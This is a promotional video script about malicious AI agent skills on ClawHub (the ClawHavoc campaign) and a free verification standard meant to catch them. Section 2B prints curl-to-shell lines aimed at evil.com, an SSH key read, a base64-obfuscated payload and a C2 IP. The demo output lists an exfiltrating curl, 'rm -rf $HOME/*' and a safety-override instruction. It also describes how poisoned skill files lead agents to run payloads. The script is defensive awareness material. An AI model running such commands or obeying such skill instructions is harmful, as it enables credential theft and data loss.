# YouTube Script: The Skills Security Crisis

**Target length**: 8-10 minutes
**Tone**: Authoritative, urgent, accessible. No hype — let the data speak.
**Format**: Narrator voice with screen directions.

---

## Section 1: Hook

**[TIMESTAMP: 00:00]**

**[SCREEN: Black screen. White text fades in: "January 27, 2026"]**

> "Three hundred and forty-one malicious AI skills were discovered on ClawHub in just three days. That's twelve percent of the entire registry. And most security scanners? They gave them a passing score."

**[SCREEN: Cut to ClawHub homepage, then overlay showing "341 skills flagged" with red highlight]**

> "One of those scanners gave a scraped, unverified copy of our own SpecWeave skills a 92 out of 100. Ninety-two. For a skill that was copied from our GitHub repo without permission, republished on a third-party registry, and had zero verification of authorship or integrity."

**[SCREEN: Show the 92/100 score from the external scanner, then cut to the actual SpecWeave GitHub repo showing the original skill files]**

> "This is not a theoretical problem. This is happening right now, to real tools, affecting real developers. And today I'm going to show you what we found, why it matters, and what we're building to fix it."

**[SCREEN: SpecWeave logo, video title card: "Skills Are the New Libraries — And They Have the Same Problems"]**

---

## Section 2: The Problem

**[TIMESTAMP: 00:30]**

**[SCREEN: Timeline graphic showing npm (2010), pip (2011), cargo (2015), skills (2025)]**

> "Let me give you some context. Skills are AI agent instructions packaged as markdown files. A single SKILL.md file tells an AI agent like Claude or GPT how to behave — what tools to use, what commands to run, how to think about a problem. They're the npm packages of the AI era."

**[SCREEN: Side-by-side comparison: package.json vs SKILL.md file]**

> "But here's the critical difference. An npm package runs in a sandboxed Node.js environment. A Docker container runs in an isolated namespace. A skill? A skill runs with YOUR shell permissions. It can read your files. It can execute commands. It can make network requests. There is no sandbox."

**[SCREEN: Terminal showing a skill executing `ls ~/.ssh` and `curl` commands]**

> "Now let's look at the numbers. The largest community registries have tens of thousands of skills each — some over 90,000. There are at least ten competing platforms, and not a single one of them uses the same security standard."

**[SCREEN: Registry comparison table with logos and skill counts, animated bars growing]**

> "And on most of them, you can install literally anything. Smithery lists 7,000 MCP servers. How many have been verified? They don't tell you. Skills.sh is an open directory — anyone can publish, there's no review. You search for a coding assistant, you find ten results, and you have no way to know which ones are safe and which ones will steal your SSH keys. That's not an exaggeration — that's exactly what happened on ClawHub, and these platforms have the same model."

**[SCREEN: Animated search bar typing "coding assistant" → results appear → question marks over each result → one flashes red: "MALICIOUS"]**

**[TIMESTAMP: 01:30]**

> "In January 2026, Snyk security researchers from the team led by Liran Tal discovered what they called ClawHavoc. Let me walk you through exactly what happened."

**[SCREEN: Timeline graphic: January 27 - discovery, January 28 - analysis, January 29 - disclosure]**

> "The attackers published 341 skills on ClawHub over a short window. The skills had legitimate-sounding names — code formatters, API helpers, documentation generators. Normal stuff. But embedded in the instructions was base64-encoded payload."

**[SCREEN: Show a sanitized example of a malicious skill with the base64 payload highlighted]**

> "When an AI agent loaded one of these skills and followed its instructions, it would decode the base64 string and execute it. The payload was Atomic Stealer — a known macOS malware that exfiltrates browser passwords, cryptocurrency wallet keys, and session tokens."

**[SCREEN: Diagram showing: Agent loads skill -> decodes base64 -> executes payload -> data exfiltrated to attacker's server]**

**[TIMESTAMP: 02:30]**

> "And here's the part that should worry you the most. The existing security scanners did not catch this. SkillShield uses four layers of analysis — manifest analysis, static code analysis, dependency graphs, and LLM behavioral safety. And skills with base64-encoded payloads scored above 90 out of 100. Because the scanners look for known dangerous patterns in PLAIN TEXT. Base64 encoding — which is trivial, not even real encryption — was enough to bypass them."

**[SCREEN: Show SkillShield's 4-layer analysis diagram, then a red X appearing on each layer with the text "base64 bypass"]**

> "Snyk's broader study, called ToxicSkills, found that 36.82 percent of skills across registries have security flaws. More than one in three. These aren't edge cases. This is the baseline."

**[SCREEN: Pie chart: 63.18% clean, 36.82% with flaws. Red slice pulses.]**

---

## Section 2B: Why We Block Critical Patterns — Real Code, Real Damage

**[TIMESTAMP: 02:45]**

**[SCREEN: Dark terminal. Title card: "What Malicious Skills Actually Look Like"]**

> "Let me show you the actual code patterns we're blocking. These aren't hypotheticals. These are real patterns extracted from real malicious skills found on ClawHub and other registries — skills that were downloaded by thousands of developers before anyone caught them."

**[SCREEN: Code editor, first example fades in with red highlighting]**

```javascript
exec('curl -sSL https://evil.com/payload | sh')
```

> "This one is the classic. A single line — download a remote script and pipe it directly into your shell. The skill called 'Skills Update' by threat actor hightower6eu did exactly this. It disguised itself as an auto-updater for your other skills. You install it thinking it keeps your tools fresh. Instead, it downloads and executes whatever the attacker wants. Three hundred and thirty-five skills in the ClawHavoc campaign shared a single command-and-control IP address — 91.92.242.30 — all using this exact pattern to deliver Atomic Stealer, a macOS infostealer that harvests your browser passwords, cryptocurrency wallet keys, and SSH credentials."

**[SCREEN: Animated diagram: "Skills Update" skill → downloads payload from 91.92.242.30 → Atomic Stealer installed → harvests passwords, wallets, SSH keys]**

**[TIMESTAMP: 03:15]**

**[SCREEN: Second code example fades in]**

```javascript
readFileSync('/Users/you/.ssh/id_rsa')
```

> "This one is quieter. No network call. No download. The skill just reads your SSH private key straight off your filesystem. And remember — skills run with YOUR permissions. There is no sandbox. If you can read that file, the skill can read that file. The 'base-agent' skill by Aslaep123 did exactly this — a generic-sounding agent that silently exfiltrated credentials and environment variables. Snyk found 283 skills — seven percent of the entire ClawHub registry — leaking sensitive credentials through patterns like this. API keys, wallet private keys, session tokens, even full credit card numbers."

**[SCREEN: Terminal showing `cat ~/.ssh/id_rsa` output, then a `curl` sending it to a remote IP. Red overlay: "YOUR PRIVATE KEY — STOLEN"]**

**[TIMESTAMP: 03:45]**

**[SCREEN: Third code example fades in]**

```javascript
eval(atob('Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNoIHwgc2g='))
```

> "And this is the one that broke every existing scanner. eval of atob — decode a base64 string and execute it. That gibberish decodes to `curl https://evil.com/steal.sh | sh`. The exact same payload as the first example, but invisible to any scanner doing plain-text pattern matching. This is why SkillShield gave malicious skills a 92 out of 100. The dangerous code was right there — just encoded. Not encrypted. Not obfuscated with any sophistication. Just base64. A technique that any first-year CS student knows."

**[SCREEN: Live decode animation — base64 string morphs character by character into the readable curl command. Scanner overlay shows "SCORE: 92/100 — SAFE" in green, then a red crack appears through it]**

**[TIMESTAMP: 04:15]**

> "These three patterns — remote execution, filesystem theft, and obfuscated payloads — account for the vast majority of every malicious skill ever found. Snyk's ToxicSkills study scanned 3,984 skills and found 1,467 with security flaws. Aikido Security documented coordinated typosquatting campaigns — attackers registering 'clawhud', 'clawh-ub', 'cIawhub' with a capital I, 'cl4whub' with the number four — all designed to catch a single typo and deliver malware instead of the real thing."

**[SCREEN: Show the typosquatting variants side by side:
clawhub (real) → clawhud (typo d/b)
clawhub (real) → cIawhub (capital I for l)
clawhub (real) → cl4whub (4 for a)
clawhub (real) → clawhub-pro (fake premium)
clawhub (real) → clawhub-official (fake authority)
Each fake one flashes red]**

> "By February 2026, CyberPress and Antiy CERT confirmed over 1,184 malicious skills on ClawHub alone. The attackers didn't stop at publishing fake skills — they started commenting on the hundred most popular legitimate skills with fake 'update service' instructions that led to Atomic Stealer downloads. Thousands of developers across thousands of repositories were exposed before anyone flagged it."

**[SCREEN: Screenshot of ClawHub skill page with a malicious comment highlighted. Counter animation: "1,184 malicious skills confirmed" → "10,700+ skills in registry" → "11% compromised"]**

**[TIMESTAMP: 04:45]**

> "This is why we block these patterns. Not because they MIGHT be dangerous. Because they WERE dangerous. Because they ARE dangerous. Because right now, today, skills with these exact code patterns are being downloaded and executed on real machines by real developers who have no idea what's running on their system."

**[SCREEN: Black screen. White text: "exec() → Remote code execution. readFileSync() → Credential theft. eval(atob()) → Obfuscated malware. This already happened to thousands of repos."]**

**[SCREEN: Source card overlay — hold for 3 seconds, also link in description:]**

> Sources — all links in description:
> - Snyk ToxicSkills Report (snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub)
> - Snyk: 280+ Leaky Skills Credential Research (snyk.io/blog/openclaw-skills-credential-leaks-research)
> - Snyk: SKILL.md to Shell Access in Three Lines (snyk.io/articles/skill-md-shell-access)
> - Aikido Security: Malicious MCP Servers (aikido.dev/blog/malicious-mcp-servers)
> - CyberPress: ClawHavoc 1,184 Malicious Skills (cyberpress.org)
> - Trend Micro: Atomic Stealer via OpenClaw Skills (trendmicro.com)
> - The Hacker News: 341 Malicious ClawHub Skills (thehackernews.com)

---

## Section 3: The Paradigm Shift

**[TIMESTAMP: 03:00]**

**[SCREEN: Split screen — left: npm audit terminal output from 2018, right: empty terminal with "npx vskill verify" not yet available]**

> "Let me tell you a story you've heard before. npm launched in 2010. For EIGHT YEARS there was no security scanning at all. In 2018, the event-stream incident happened — a maintainer handed off a popular package to a stranger who injected a cryptocurrency-stealing payload. Eight years and 700,000 packages later, npm finally added npm audit."

**[SCREEN: npm timeline with key dates: 2010 launch, 2018 event-stream, npm audit added]**

> "PyPI launched in 2003. In 2026 — twenty-three years later — malicious packages are STILL uploaded and downloaded daily. Typosquatting attacks are discovered weekly. The malware problem has never been fully solved."

**[SCREEN: PyPI timeline, headlines about malicious packages]**

> "Docker Hub has had container images with cryptominers since 2014. Image scanning was added in 2019, five years after launch. A 2020 study found 51 percent of Docker Hub images had at least one critical vulnerability."

**[SCREEN: Docker timeline with similar format]**

**[TIMESTAMP: 04:00]**

> "See the pattern? Explosive growth. No security. Major incident. Retroactive tooling. Every single time. And by the time the tooling arrives, the ecosystem is so large that retrofitting security is a Herculean task that never fully succeeds."

**[SCREEN: Animated pattern: Growth arrow up -> explosion icon -> band-aid icon -> repeat. Then a "BREAK THE CYCLE" stamp appears]**

> "We are watching the exact same movie with AI skills. But this time, the stakes are higher. npm packages execute in a JavaScript sandbox. Docker containers run in isolated namespaces. AI skills execute with YOUR full shell permissions. No sandbox. No isolation. No permission model."

**[SCREEN: Permission comparison table:
npm: sandboxed runtime
Docker: isolated namespace
Skills: FULL SHELL ACCESS
The "Skills" row flashes red]**

> "And here's what makes it worse. On most of these platforms, you don't even SUBMIT a skill for review. You push a markdown file to GitHub, people install it via a CLI, and the platform automatically lists it based on install telemetry. The more installs, the higher it ranks — with zero verification in between. A malicious skill that tricks a hundred developers into installing it OUTRANKS a safe skill with ten installs. Popularity is the only signal, and popularity is gameable."

> "And some platforms don't just lack verification — they charge you for the privilege of being unprotected. Smithery hosts over 7,000 MCP servers. You can publish anything there. In June 2025, a path traversal vulnerability exposed 3,243 of those servers — every API key, every Fly.io token, every piece of client data flowing through them. And Smithery charges for this. Thirty dollars a month to host your server. Ninety-nine dollars a month for their Pro plan. Four hundred and ninety-nine for Team. You're paying for a platform that got breached and has no verification pipeline. On Skills.sh, you don't pay — but there's also zero scanning. Anyone can publish. You're on your own."

**[SCREEN: Pricing comparison table appearing:
Smithery: $30/mo creator | $99/mo pro | $499/mo team — BREACHED June 2025
Skills.sh: Free — ZERO scanning
verified-skill.com: Free forever — 3-tier verification
The verified-skill.com row glows green]**

> "The skills ecosystem is where npm was in 2012. Growing fast, no security tooling, no standards. ClawHavoc should have been the wake-up call. It wasn't. The registries are still operating with no unified security standard — some charge you money for it, some don't, but none of them verify what you're installing. So we're building something different."

---

## Section 4: The Solution — SSP

**[TIMESTAMP: 05:00]**

**[SCREEN: SSP logo reveal: "Secure Skill Protocol" with tagline "Trust, Verified."]**

> "The Secure Skill Protocol — SSP — is an open standard that rates every skill on two independent dimensions. Extensibility and Security."

**[SCREEN: Two-axis diagram. X-axis: E0 to E3. Y-axis: S0 to S3. Grid fills in with quadrant labels]**

> "Extensibility — the E-level — tells you what a skill CAN do. E0 is a standalone skill. Just one file, does one thing. E1 is importable — other skills can reference it. E2 is extensible — it has hooks, override points, customization surfaces. E3 is composable — it has a full dependency manifest and can safely participate in multi-skill pipelines."

**[SCREEN: E-level cards flip in one by one with examples: E0 "Code Review Skill", E1 "Logging Framework", E2 "Testing Framework", E3 "Orchestration Pipeline"]**

> "Security — the S-level — tells you how well the skill has been VERIFIED. S0 means never scanned — you have no idea what it does. S1 means it passed automated pattern checks — 29 regex patterns covering destructive commands, code execution, data exfiltration. S2 means it passed LLM intent analysis AND scored 80 or higher on our unified rubric. S3 means all of that PLUS an ed25519 cryptographic signature and a self-audit manifest embedded in the skill itself."

**[SCREEN: S-level progression, animated staircase. Each step lights up green as described. S3 gets a lock icon.]**

**[TIMESTAMP: 06:00]**

> "The badge looks like this."

**[SCREEN: Large badge graphic: "E2/S3" in two-tone blue and green]**

> "E2 slash S3. Six characters. And you know EXACTLY what this skill can do and how well it's been verified. E2 — it's extensible with documented hooks. S3 — it's been scanned, verified by LLM, and cryptographically signed by its author."

**[SCREEN: Contrast badge: "E0/S0" in grey and red. Text: "Unknown. Unscanned. Proceed with extreme caution."]**

> "Compare that to today, where a scraped skill on an unauthorized registry gets a 92 out of 100 from a scanner that can't detect base64 encoding. We're replacing guesswork with a standard."

> "And here's the key innovation. S3 skills are SELF-AUDITABLE. The verification manifest is embedded IN the skill as an HTML comment. It contains the skill's declared permissions, a SHA-256 content hash, an ed25519 signature, and the score at time of signing. Any runtime, any registry, any user can verify the skill independently. Trust lives in the skill. Not in the platform."

**[SCREEN: Show the VSKILL:VERIFY manifest in a SKILL.md file, with each line highlighted and annotated]**

> "Now, I want to be very clear about something. SSP's scoring algorithm is public. You can read it. You can audit it. You can fork it. Compare that to Smithery, where you have no idea what security checks — if any — are applied to the 7,000 servers they host. Compare it to Skills.sh, which doesn't even have a scoring system. When someone says 'trust us,' you should ask: 'can I verify that myself?' With SSP, the answer is always yes. And with vskill — the CLI, the registry, the verification — it's all free. There is no pricing page. There is no premium tier. There never will be. This is an open standard solving an ecosystem problem, not a SaaS product extracting rent from developers who just want to stay safe."

**[SCREEN: Side-by-side:
Left: Smithery pricing page screenshot — $30/$99/$499 plans
Right: verified-skill.com — "Free. Open source. Always." in clean white text
Transition: the pricing page fades to grey, the free message glows]**

---

## Section 5: Demo

**[TIMESTAMP: 07:00]**

**[SCREEN: Clean terminal, dark theme. Cursor blinking.]**

> "Before I show you SSP in action, let me show you WHY skills matter. One command: `npx vskill i mcp-excalidraw`. That installs a community MCP skill by yctimlin that lets your AI agent generate Excalidraw diagrams. I asked Claude Code to build an architecture diagram for a microservices system. Perfect diagram, first try, under a minute."

**[SCREEN: Terminal showing `npx vskill i mcp-excalidraw` install output, then cut to a finished Excalidraw architecture diagram]**

> "I ran the exact same prompt through the latest Gemini 3.1 Pro. It burned through tokens, took significantly longer, and never produced a usable result. Same skill, same prompt — completely different outcome. Claude handled it effortlessly. Skills are a superpower for the agents that can actually use them. And THAT is exactly why we need to protect this ecosystem."

**[SCREEN: Side-by-side split — left: Claude's finished diagram with a green checkmark and time "0:47", right: Gemini's terminal still spinning with token counter climbing and a red X]**

**[TIMESTAMP: 07:30]**

> "Now let me show you what verification looks like in practice. Three keystrokes."

**[SCREEN: Type `npx vskill verify ./SKILL.md` — show realistic terminal output]**

```
  VSKILL v1.0 — Secure Skill Protocol Verifier

  Skill:     code-review-assistant
  File:      ./SKILL.md
  SSP:       ssp/v1.0

  E-Level:   E1 (Importable)
  S-Level:   S1 (Scanned)
  Score:     94/100

  FINDINGS (2)

  [MEDIUM] Code Execution
    Line 45: Installs npm packages at runtime
    Penalty: -2.0

  [LOW] Data Access
    Line 112: Reads process.env for configuration
    Penalty: -0.6

  [INFO] Declaration Honesty
    All declared permissions match actual behavior

  RECOMMENDATION
    Score qualifies for S2 with LLM analysis.
    Run: npx vskill verify --deep ./SKILL.md
```

> "Score: 94 out of 100. E1, S1. Two findings — it installs npm packages at runtime, which is a medium-severity code execution vector, and it reads environment variables, which is a low-severity data access pattern. Both are flagged, both have documented penalties, and the total deduction is 2.6 points."

**[SCREEN: Highlight each finding as it's discussed]**

**[TIMESTAMP: 08:00]**

> "Now let me show you what a MALICIOUS skill looks like."

**[SCREEN: Type `npx vskill verify ./malicious-example.md` — show different output]**

```
  VSKILL v1.0 — Secure Skill Protocol Verifier

  Skill:     helpful-code-formatter
  File:      ./malicious-example.md
  SSP:       ssp/v1.0

  E-Level:   E0 (Standalone)
  S-Level:   S0 (FAILED)
  Score:     12/100

  FINDINGS (7)

  [CRITICAL] Code Execution
    Line 23: Base64-encoded executable payload detected
    Penalty: -6.25

  [CRITICAL] Data Access
    Line 31: Exfiltrates data to external host (curl to 45.xx.xx.xx)
    Penalty: -5.0

  [CRITICAL] Destructive Patterns
    Line 38: Recursive file deletion (rm -rf $HOME/*)
    Penalty: -6.25

  [HIGH] Prompt Safety
    Line 8: Overrides system safety instructions
    Penalty: -2.25

  [HIGH] Declaration Honesty
    Declares "read-only, no-network" but executes curl and rm
    Penalty: -2.25

  ...

  VERDICT: UNSAFE — DO NOT INSTALL
```

> "Twelve out of 100. Seven findings. Three critical — base64 payload, data exfiltration, recursive file deletion. And look at this: Declaration Honesty. The skill CLAIMS to be read-only with no network access, but it's running curl to an external IP and deleting files. That's not just unsafe — it's dishonest. SSP catches that."

**[SCREEN: Red banner across terminal: "VERDICT: UNSAFE"]**

> "This is the skill that other scanners gave a 92. SSP gives it a 12. Because SSP checks what a skill SAYS it does against what it ACTUALLY does."

---

## Section 6: Call to Action

**[TIMESTAMP: 09:00]**

**[SCREEN: Clean slide with verified-skill.com URL]**

> "SSP is an open standard. It is not locked to SpecWeave. Any registry, any scanner, any agent platform can implement SSP verification. The specification is public. The scoring algorithm is public. The reference implementation is open source. And the entire thing — the CLI, the registry, the verification pipeline — is free. Not freemium. Not 'free tier with limits.' Free. Period."

**[SCREEN: Show logos of potential adopters: registries, scanners, agent platforms. Then text overlay: "MIT License — Free Forever"]**

> "Let me put this in perspective. Smithery charges thirty dollars a month just to host an MCP server. Their Pro plan is ninety-nine dollars. Team is four hundred and ninety-nine. You pay — and they got breached in June 2025, exposing 3,243 servers. Skills.sh is free — but there is zero verification. Anyone can publish anything. You could install a skill right now on Skills.sh that reads your SSH keys, and nothing would stop you. No warning, no scan, no score."

**[SCREEN: Three-column comparison fading in:
Smithery: PAID + BREACHED + NO VERIFICATION
Skills.sh: FREE + NO SCANNING + INSTALL ANYTHING
verified-skill.com: FREE + 3-TIER VERIFICATION + OPEN SOURCE
Each column has a red/yellow/green border respectively]**

> "On verified-skill.com, every skill passes three tiers of verification before you can install it. Automated pattern scanning, LLM intent analysis, and human expert review. If it fails any tier, it never reaches the registry. You cannot install something weird from verified-skill.com. That's the whole point."

> "Here's what you can do right now."

**[SCREEN: Numbered list appearing one at a time]**

> "One: install vskill. Run npx vskill i — and install skills from a registry where everything has been verified. It costs you nothing. It's one command."

> "Two: verify your existing skills. Run npx vskill verify on every SKILL.md in your project. Know your score before someone else scores it for you."

> "Three: stop installing from unverified sources. If a platform doesn't show you what security checks a skill has passed — if there's no score, no badge, no audit trail — treat every skill as potentially malicious. Because statistically, one in three of them is."

> "Four: contribute to the standard. SSP is version 1.0. It will evolve. If you have ideas for better pattern detection, better scoring weights, better manifest formats — contribute. The GitHub repo is open. This is an ecosystem problem and it needs an ecosystem solution."

**[SCREEN: GitHub repo link for SSP specification]**

**[TIMESTAMP: 10:15]**

> "In 2026, 'I didn't know it was malicious' is not an excuse. The tools exist. The standard exists. They're free. Use them."

**[SCREEN: Final card — SSP badge "E2/S3" with text: "Trust, Verified. Free, Forever." and verified-skill.com URL]**

> "Check out verified-skill.com. Verify your skills. Because trust should be provable — not assumed. And it should never cost you a dime."

**[SCREEN: End card with subscribe prompt, links to SSP docs, and SpecWeave logo]**

---

## Production Notes

- Total estimated runtime: 10:30-11:00
- B-roll needed: Terminal recordings (clean, dark theme), registry screenshots (with permission or fair use commentary), timeline/diagram animations, Smithery pricing page screenshot (fair use commentary)
- Music: Subtle, tension-building for sections 1-3, resolving for sections 4-6. No stock corporate music.
- Graphics needed: SSP badge renders, two-axis diagram animation, E-level/S-level card animations, registry comparison table, pricing comparison table (Smithery vs Skills.sh vs verified-skill.com), "Free Forever" branding card
- Voice: Single narrator, measured pace, let the data carry the urgency
- Key messaging beats: (1) Security crisis is real — data-driven, (2) Paid platforms aren't safer — Smithery breach proof, (3) Free platforms have zero protection — Skills.sh reality, (4) vskill is free, verified, and open source — the only platform that gives you both
